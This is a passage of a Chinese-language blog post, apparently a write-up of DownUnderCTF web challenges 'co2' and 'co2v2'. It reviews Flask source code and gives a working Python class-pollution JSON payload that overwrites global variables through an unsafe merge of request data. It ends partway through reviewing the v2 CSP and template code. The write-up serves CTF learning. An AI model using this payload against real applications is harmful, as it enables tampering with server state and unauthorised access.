        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>gopher</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>DownunderCTf复现</title>
    <url>/posts/4cfd8fa8/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h3><pre class="language-bash" data-language="bash"><code class="language-bash">A group of students <span class="token function">who</span> don<span class="token string">'t like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You'</span>ve been hired to perform an in-depth whitebox <span class="token builtin class-name">test</span> on their web application.</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/08/OP0BjK.png" alt="OP0BjK.png" loading="lazy"><br>正如描述所说是一个博客网站,看一下路由</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    posts <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>is_public<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> posts<span class="token operator">=</span>posts<span class="token punctuation">)</span></code></pre>
<p>根目录正常index界面</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        hashed_password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'pbkdf2:sha256'</span><span class="token punctuation">)</span>
        new_user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password<span class="token operator">=</span>hashed_password<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span></code></pre>
<p>注册用户，密码使用<code>pbkdf2:sha256</code>哈希，注册成功重定向到登录界面</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user <span class="token keyword">and</span> check_password_hash<span class="token punctuation">(</span>user<span class="token punctuation">.</span>password<span class="token punctuation">,</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span></code></pre>
<p>登录界面，正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span></code></pre>
<p>退出路由，也正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/profile"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"profile.html"</span><span class="token punctuation">)</span></code></pre>
<p>profile正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    posts <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>author<span class="token operator">=</span>current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"dashboard.html"</span><span class="token punctuation">,</span> posts<span class="token operator">=</span>posts<span class="token punctuation">)</span></code></pre>
<p>dashboard正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/blog/&lt;blog_id>"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">blog</span><span class="token punctuation">(</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    post <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> post<span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">"Blog post does not exist!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"blog.html"</span><span class="token punctuation">,</span> post<span class="token operator">=</span>post<span class="token punctuation">)</span></code></pre>
<p>博客路由正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/edit/&lt;blog_id>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">edit_blog_post</span><span class="token punctuation">(</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blog <span class="token operator">=</span> BlogPost<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span>blog_id<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        blog<span class="token punctuation">.</span>title <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span>
        blog<span class="token punctuation">.</span>content <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span>
        blog<span class="token punctuation">.</span>is_public <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>blog<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/blog/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>blog<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> blog <span class="token keyword">and</span> current_user<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">==</span> blog<span class="token punctuation">.</span>author<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"edit_blog.html"</span><span class="token punctuation">,</span> blog<span class="token operator">=</span>blog<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/403"</span><span class="token punctuation">)</span></code></pre>
<p>博客编辑，也正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/create_post"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">create_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        post <span class="token operator">=</span> BlogPost<span class="token punctuation">(</span>title<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> content<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> author<span class="token operator">=</span>current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span>
        post<span class="token punctuation">.</span>is_public <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>post<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"create_post.html"</span><span class="token punctuation">)</span></code></pre>
<p>创建文章，正常</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/changelog"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">changelog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"changelog.html"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/feedback"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">feedback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"feedback.html"</span><span class="token punctuation">)</span></code></pre>
<p>都没问题</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/save_feedback"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">save_feedback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    feedback <span class="token operator">=</span> Feedback<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.</span>
    merge<span class="token punctuation">(</span>data<span class="token punctuation">,</span> feedback<span class="token punctuation">)</span>
    save_feedback_to_disk<span class="token punctuation">(</span>feedback<span class="token punctuation">)</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"success"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span></code></pre>
<p>这个可能有问题，因为进行json解析,并且存在merge，可能存在类污染<br>解析request获取到的json数据，然后将解析到的数据合并到feedback中</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Feedback</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">""</span>
        self<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token string">""</span>
        self<span class="token punctuation">.</span>rating <span class="token operator">=</span> <span class="token string">""</span>
        self<span class="token punctuation">.</span>referred <span class="token operator">=</span> <span class="token string">""</span></code></pre>
<p>看一下获取flag的路由</p>
<pre class="language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_flag"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">"true"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"DUCTF&#123;NOT_THE_REAL_FLAG&#125;"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Nope"</span></code></pre>
<p>如果环境变量里面的flag,如果里面的flag值为true返回flag，那就很明显了，通过merge污染Feedback，进而污染环境变量<br>抓个包</p>
<pre class="language-none"><code class="language-none">POST &#x2F;save_feedback HTTP&#x2F;1.1
Host: 43.143.198.113:1337
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko&#x2F;20100101 Firefox&#x2F;127.0
Accept: *&#x2F;*
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Referer: http:&#x2F;&#x2F;43.143.198.113:1337&#x2F;feedback
Content-Type: application&#x2F;json
Content-Length: 54
Origin: http:&#x2F;&#x2F;43.143.198.113:1337
Connection: close
Cookie: session&#x3D;.eJwljjEOAyEMwP7C3IGQhMB95kRIonblelPVvxepkxfL8iedsfx6puO9bn-k82XpSDgBSxi30cQyN-EpLAQmm5Q5fIqKl4oNwkNnrWrZgbCwK3QaTpJ7C4ZoTjQqFe0aXHvNCNCUyxwso--K4RzZjEW2k2kiYdoj9-Xrf1PS9weRQS69.ZouQPw.XhaKk65CdTp1wlBv4oa-aeHPf6U
Priority: u&#x3D;1

&#123;&quot;title&quot;:&quot;1&quot;,&quot;content&quot;:&quot;1&quot;,&quot;rating&quot;:&quot;1&quot;,&quot;referred&quot;:&quot;&quot;&#125;</code></pre>
<p>将post的数据改成</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
<span class="token property">"__class__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"flag"</span><span class="token operator">:</span><span class="token string">"true"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>发送然后访问<code>get_flag</code>路由<br><img src="https://ooo.0x0.ooo/2024/07/08/OP0zeL.png" alt="OP0zeL.png" loading="lazy"></p>
<h2 id="co2v2"><a href="#co2v2" class="headerlink" title="co2v2"></a>co2v2</h2><pre class="language-none"><code class="language-none">Well the last time they made a big mistake with the flag endpoint, now we don&#39;t even have it anymore. It&#39;s time for a second pentest for some new functionality they have been working on.</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/08/OP0hIX.png" alt="OP0hIX.png" loading="lazy"><br>多出来个report<br>在v2版本中，<code>get_flag</code>路由被删掉了<br>看一下新添的内容</p>
<pre class="language-python" data-language="python"><code class="language-python">CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
SECRET_NONCE <span class="token operator">=</span> generate_random_string<span class="token punctuation">(</span><span class="token punctuation">)</span>
RANDOM_COUNT <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span>
limiter <span class="token operator">=</span> Limiter<span class="token punctuation">(</span>
    app<span class="token operator">=</span>app<span class="token punctuation">,</span>
    key_func<span class="token operator">=</span>get_remote_address<span class="token punctuation">,</span>
    default_limits<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"60 per minute"</span><span class="token punctuation">]</span>
<span class="token punctuation">)</span>
TEMPLATES_ESCAPE_ALL <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment">#转义所有输出</span>
TEMPLATES_ESCAPE_NONE <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token keyword">def</span> <span class="token function">generate_nonce</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    nonce <span class="token operator">=</span> SECRET_NONCE <span class="token operator">+</span> data <span class="token operator">+</span> generate_random_string<span class="token punctuation">(</span>length<span class="token operator">=</span>RANDOM_COUNT<span class="token punctuation">)</span>
    sha256_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sha256_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>nonce<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    hash_hex <span class="token operator">=</span> sha256_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    g<span class="token punctuation">.</span>nonce <span class="token operator">=</span> hash_hex
    <span class="token keyword">return</span> hash_hex
<span class="token keyword">def</span> <span class="token function">set_nonce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    generate_nonce<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span></code></pre>
<p>生成一个随机字符串赋值给<code>SECRET_NONCE</code>，在生成一个随机整数<code>RANDOM_COUNT</code>,两个变量用来生成一个nonce,<code>SECRET_NONCE</code>+请求路径+<code>RANDOM_COUNT</code>长度的字符串然后经过哈希和转16进制得到nonce</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">apply_csp</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    nonce <span class="token operator">=</span> g<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nonce'</span><span class="token punctuation">)</span> <span class="token comment">#从全局对象获取nonce字段的值</span>
    csp_policy <span class="token operator">=</span> <span class="token punctuation">(</span>
        <span class="token string-interpolation"><span class="token string">f"default-src 'self'; "</span></span> <span class="token comment">#默认内容来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"script-src 'self' 'nonce-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nonce<span class="token punctuation">&#125;</span></span><span class="token string">' https://ajax.googleapis.com; "</span></span> <span class="token comment">#脚本来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"style-src 'self' 'nonce-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nonce<span class="token punctuation">&#125;</span></span><span class="token string">' https://cdn.jsdelivr.net; "</span></span>   <span class="token comment">#style来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"script-src-attr 'self' 'nonce-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nonce<span class="token punctuation">&#125;</span></span><span class="token string">'; "</span></span>  <span class="token comment">#脚本属性来源于自身</span>
        <span class="token string-interpolation"><span class="token string">f"connect-src *; "</span></span>  <span class="token comment">#允许所有连接</span>
    <span class="token punctuation">)</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> csp_policy <span class="token comment">#将生成的CSP策略添加到响应头里面</span>
    <span class="token keyword">return</span> response</code></pre>
<p>该函数向http响应中添加了内容安全策略(Content Security Policy)头</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Not allowed.'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> decorated_function</code></pre>
<p>装饰器函数没看出来有什么用</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">admin_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated <span class="token keyword">or</span> current_user<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Not allowed.'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">return</span> decorated_function</code></pre>
<p>也是没什么用</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/changelog"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">changelog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>env<span class="token punctuation">.</span>get_template<span class="token punctuation">(</span><span class="token string">"changelog.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>nonce<span class="token operator">=</span>g<span class="token punctuation">.</span>nonce<span class="token punctuation">)</span></code></pre>
<p>获取修改日志</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin/update-accepted-templates"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">update_template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token comment"># Enforce strict policy to filter all expressions</span>
